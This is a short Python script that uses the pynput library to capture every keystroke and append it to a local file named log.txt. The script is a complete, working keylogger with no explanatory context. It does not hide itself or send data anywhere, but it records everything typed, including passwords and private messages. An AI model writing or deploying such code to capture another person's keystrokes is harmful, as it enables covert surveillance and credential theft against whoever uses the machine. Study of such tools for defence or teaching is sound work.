from pynput import keyboard

def on_press(key):
    try:
        with open('log.txt','a') as f:
            print(f'Key pressed: {key.char}', file = f)
    except AttributeError:
        with open('log.txt','a') as f:
            print(f'Key pressed: {key}', file = f)

listener = keyboard.Listener(on_press = on_press)
listener.start()
listener.join()